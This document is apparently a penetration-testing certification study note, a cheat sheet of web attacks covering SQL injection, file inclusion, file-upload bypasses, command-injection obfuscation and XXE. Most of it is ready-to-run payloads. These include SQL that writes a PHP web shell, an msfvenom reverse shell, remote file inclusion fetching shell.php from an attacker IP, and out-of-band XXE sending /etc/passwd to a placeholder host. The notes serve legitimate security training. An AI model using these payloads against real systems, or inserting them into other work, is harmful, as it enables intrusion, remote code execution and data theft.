---
title: "Web Attacks"
date: 2026-03-31 10:14:00 +0000
categories: [Certifications Technical Notes, Certified Penetration Testing Specialist (CPTS)]
tags: [offensive security, web attacks]
---

## Ffuf

### Page Fuzzing

1. Fuzz extensions with index
```bash
    ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ
    # or use this: -e .php
```

2. Page fuzzing
```bash
    ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php
```

---

### Recursion Fuzzing

```bash
    ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
    # -recursion for recursive scan
    # -recursion-depth to specify the depth
    # -v to provide full URL (accuracy)
```

---

### Vhost Enumeration

- Vhosts may or may not have public DNS records.

```bash
    ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'
```

---

### Parameter Fuzzing - GET

```bash
    ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
```

---

### Parameter Fuzzing - POST

```bash
    ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx
```

---

## SQL Injection

| **Payload** | **Description** |
| --- | --- |
| **Auth Bypass** | |
| `admin' or '1'='1` | Basic Auth Bypass |
| `admin')-- -` | Basic Auth Bypass With comments |
| **Union Injection** | |
| `' order by 1-- -` | Detect number of columns using `order by` |
| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection |
| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
| `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
| **DB Enumeration** | |
| `SELECT @@version` | Fingerprint MySQL with query output |
| `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
| **Privileges** | |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Find all user privileges |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
| **File Injection** | |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a local file |
| `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -` | Write a web shell into the base web directory |

---

## SQLMap

| **Command** | **Example Usage** | **Function** |
| --- | --- | --- |
| Basic Test | `sqlmap -u "http://example.com/vulnerable.php?id=1"` | Tests URL for SQLi |
| Blind SQLi Test | `sqlmap -u "..." --technique=BLIND` | Tests for blind SQLi |
| Time-based SQLi | `sqlmap -u "..." --technique=TIME` | Tests for time-based blind SQLi |
| Enum Databases | `sqlmap -u "..." --dbs` | Retrieves the list of databases |
| Enum Tables | `sqlmap -u "..." -D users --tables` | Lists tables in specified database |
| Enum Columns | `sqlmap -u "..." -D users -T accounts --columns` | Lists columns in specified table |
| Data Extraction | `sqlmap -u "..." -D users -T accounts --dump` | Extracts data from the table |
| Dump All | `sqlmap -u "..." --dump-all` | Dumps all data from all databases |
| Custom Header | `sqlmap -u "..." --header="Custom-Header: Value"` | Sends request with custom header |
| Use Cookies | `sqlmap -u "..." --cookie="SESSIONID=abc123"` | Uses specified cookies |
| Use Proxy | `sqlmap -u "..." --proxy="http://127.0.0.1:8080"` | Routes traffic through proxy |
| Output to File | `sqlmap -u "..." --output-dir=output` | Saves output to directory |
| Exec SQL Shell | `sqlmap -u "..." --sql-shell` | Opens SQL shell for manual commands |
| Exec OS Shell | `sqlmap -u "..." --os-shell` | Executes system commands on server |
| File Inclusion | `sqlmap -u "..." --file-write=evil.php` | Checks for file inclusion |
| File Inject | `sqlmap -u "..." --file-dest="/var/www/evil.php"` | Uploads file to the server |
| User-Agent | `sqlmap -u "..." --user-agent="Mozilla/5.0"` | Sets custom User-Agent |
| HTTP Methods | `sqlmap -u "..." --method=POST --data="user=admin&pass=1"` | Specifies HTTP method and data |
| Bypass WAF | `sqlmap -u "..." --waf` | Attempts to bypass WAFs |

---

## File Inclusion

### Introduction

- LFI vulnerable functions:
    - **PHP**: `include()`, `include_once()`, `require()`, `require_once()`, `file_get_contents()`
    - **JS**: `readfile()`, `render()`
    - **JSP**: `include`, `import`
    - **.NET (C#)**: `Response.WriteFile`, `@Html.Partial()`, `include`

> Note: Some functions only have read permissions, others execute permissions, and some both.

---

### File Disclosure (LFI)

- Basic LFI often occurs via language parameters: `http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd`
- Path traversal example (escaping from `./languages/`):
```bash
    http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
```

- **File Name Prefix Avoidance**: If input is appended (e.g. `lang_$_GET['language']`), use `/` to treat the prefix as a directory:
```bash
    http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
```

- **Appended Extension Avoidance**: If `.php` is appended, payload becomes `/etc/passwd.php`.
- **Second-Order Attacks**: Injecting malicious payloads via indirect input (e.g. username register).
```bash
    # register a username with ../../../etc/passwd
    /profile/$username/avatar.png  # expands to /profile/../../../etc/passwd/avatar.png
```

---

### Basic LFI Bypasses

- **Non-Recursive Filters** (bypassing `str_replace('../', '')`):
```bash
    # Payload
    ....//....//....//....//etc/passwd
    # Or
    ....\/
```

- **Encoding**: URL encode payloads once or twice.
- **Approved Paths**: Specifying the required folder first:
```bash
    http://<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```

- **Appended Extension (PHP < 5.3/5.4)**:
    - Path truncation: Use repetition (e.g., `.` or `./`) to exceed Max Path length (~2048 chars).
```bash
    echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```
    - Null Bytes (PHP < 5.5): `/etc/passwd%00.php`

- **Double Encoding**:
```bash
    # ....//....//....//....//....//etc/passwd
    %2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f...%65%74%63%2f%70%61%73%73%77%64
```

---

### PHP Filters

- Source code disclosure using `base64` filter wrappers:
```bash
    http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

---

## Remote Code Execution

### PHP Wrappers

- **Data Wrapper**: Requires `allow_url_include = On`. Can pass base64 encoded strings to decode and execute.
```bash
    echo '<?php system($_GET["cmd"]); ?>' | base64
    # Payload
    http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

- **Input Wrapper**: Requires POST request and `allow_url_include = On`.
```bash
    curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
```

- **Expect Wrapper**: Requires `extension=expect` enabled.
```bash
    curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

---

### Remote File Inclusion (RFI)

- Check if RFI is available by hosting a local payload and fetching via LFI:
```bash
    http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

- Execute via RFI:
```bash
    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    # Serve via HTTP, FTP, or SMB
```

- **HTTP**: `http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id`
- **FTP**: `http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id`
- **SMB**: `http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami`

---

### LFI and File Uploads

- **Malicious Image**: Craft a PHP web shell inside a `.gif` file. Adding magic bytes (`GIF8`) bypasses basic type checking. Include the image path via LFI to execute.
- **Zip Upload**: Zip a PHP shell into a `.jpg` mapping and use the `zip://` wrapper.
```bash
    echo '<?php system($_GET["cmd"]); ?>' > shell.php
    zip shell.jpg shell.php
    # Access
    http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```
- **Phar Upload**: Create a Phar archive, rename to `.jpg`, and use `phar://` wrapper to execute.
```bash
    http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

---

### Log Poisoning

- **PHP Session Poisoning**: Inject a PHP web shell into a session variable (e.g., in a language parameter). Fetch the session file from `/var/lib/php/sessions/sess_<SESSION_ID>` using LFI.
- **Server Log Poisoning**: Inject a web shell into the `User-Agent`. Load the access log via LFI.
```bash
    curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
    # Fetch /var/log/apache2/access.log or /var/log/nginx/access.log
```
> Note: Check `/proc/self/environ` or specific process FDs like `/proc/self/fd/N` (0-50) if logs aren't readable.

---

## File Upload

### Upload Exploitation

- Check backend using: Wappalyzer, source code inspection, extension checking, WhatWeb, Burp/ZAP.
- **Webshells**: e.g., `phpbash` or MSFVenom:
```bash
    msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

### Bypassing Filters

- **Client-Side Validation**: Intercept and modify the filename/body using Burp, or turn off frontend JS validation.
- **Blacklists**:
  - Windows names are case-insensitive (`pHp` might bypass `php`).
  - Fuzz various extensions (`.php3`, `.php5`, `.phtml`, etc.).
- **Whitelists**:
  - Ensure the extension rules match safely (e.g., ending with `$`).
  - Character Injection (Null Byte, spaces, directory traversal).
```bash
    # Examples
    shell.php%00.jpg  # PHP 5.x bypass
    shell.aspx:.jpg   # Windows Server alternate data streams
```
- **Type Filters**:
  - Content-Type fuzzing (intercept and change request header).
  - MIME-Type (magic bytes / file signatures).

---

### Limited File Upload

- If arbitrary execution fails, try **Cross-Site Scripting (XSS)**.
```bash
    # ExifTool XSS Comment Injection
    exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```
- **XML/SVG Upload (XXE & XSS)**:
```xml
    <!-- XSS in SVG -->
    <svg ...><script type="text/javascript">alert(window.origin);</script></svg>

    <!-- XXE in SVG (LFI - read local file) -->
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <svg>&xxe;</svg>

    <!-- Prevent source read parsing -->
    <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
    <svg>&xxe;</svg>
```

---

## Command Injection

### Detection and Execution

- Key shell injection operators: `;`, `\n`, `&`, `|`, `&&`, `||`, `""`, `$()`

### Bypassing Filters

- **Bypassing Blacklisted Spaces**:
  - URL encode `\n` (`%0a`) or `\t` (`%0a%09`).
  - Use `$IFS` (Internal Field Separator) -> `%0a${IFS}`.
  - Brace expansion -> `{ls,-la}` or `%0a{cmd}`.
- **Bypassing Other Characters**:
  - Semicolon (`;`) using shell subsetting: `${LS_COLORS:10:1}`.
  - Slashes (`\`) via Windows `%HOMEPATH:~6,-11%` or PowerShell `$env:HOMEPATH[0]`.
- **Advanced Obfuscation**:
  - Case manipulation: `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`.
  - Reversed commands: `$(rev<<<'imaohw')` or Windows PowerShell `iex "$('imaohw'[-1..-20] -join '')"`.
  - Encoded execution:
```bash
    # Linux Base64 Encode & Decode Execution
    echo -n 'cat /etc/passwd' | base64
    bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
```
```powershell
    # Windows PowerShell Base64 Execution
    iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

---

## HTTP Verb Tampering

- Tampering with HTTP methods (e.g., using `HEAD`, `PUT`, `DELETE`, or crafted non-standard verbs like `TEST`) to bypass poorly configured access control rules that only filter `GET` or `POST`.
*(Note: Duplicated Command Injection payload references in notes have been trimmed to focus strictly on Verb Tampering concepts.)*

---

## XML External Entity (XXE)

### Anatomy of XML

| Key | Example / Definition |
| --- | --- |
| `Tag` | `<date>` |
| `Entity` | `&lt;` |
| `Element` | `<date>01-01-2022</date>` |
| `Attribute` | `version="1.0"` |
| `Declaration` | `<?xml version="1.0" encoding="UTF-8"?>` |

### Exploitation

- By referencing external Document Type Definitions (DTDs), the parser replaces the entity with external resources.
```xml
    <!-- Example basic DTD vulnerability mapping -->
    <!DOCTYPE email [
      <!ENTITY company SYSTEM "file:///etc/passwd">
    ]>
    <email>&company;</email>
```
- Reading PHP source files using wrappers:
```xml
    <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```
- Remote Code Execution (Rare, requires `expect` installed):
```xml
    <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
```

---

### Advanced XXE Exploitation

- **Exfiltration with CDATA**: Useful if tags break XML structuring.
```xml
    <!-- Hosted xxe.dtd content -->
    <!ENTITY joined "%begin;%file;%end;">
    
    <!-- Injection XML Payload -->
    <!DOCTYPE email [
      <!ENTITY % begin "<![CDATA["> 
      <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> 
      <!ENTITY % end "]]>"> 
      <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> 
      %xxe;
    ]>
    <email>&joined;</email>
```

- **Error-Based XXE**: Disclose files when errors reflect parsed content.
```xml
    <!-- Hosted xxe.dtd -->
    <!ENTITY % file SYSTEM "file:///etc/hosts">
    <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
    
    <!-- Injection XML Payload -->
    <!DOCTYPE email [ 
      <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
      %remote;
      %error;
    ]>
```

- **Blind Data Exfiltration (Out-of-Band - OOB)**:
```xml
    <!-- Hosted xxe.dtd -->
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">

    <!-- Injection XML Payload -->
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE email [ 
      <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
      %remote;
      %oob;
    ]>
    <root>&content;</root>
```
> Note: Tooling like HTTP listeners, DNS interceptors (`tcpdump`), or [XXEinjector](https://github.com/enjoiz/XXEinjector) can automate retrieving this exfiltrated OOB data.
